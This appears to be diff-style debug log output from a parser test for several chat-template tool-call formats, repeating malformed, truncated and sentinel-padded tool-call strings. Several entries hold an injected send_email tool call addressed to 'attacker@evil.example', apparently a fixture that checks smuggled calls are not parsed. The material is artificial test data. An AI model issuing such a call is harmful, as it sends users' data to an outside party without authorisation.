+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
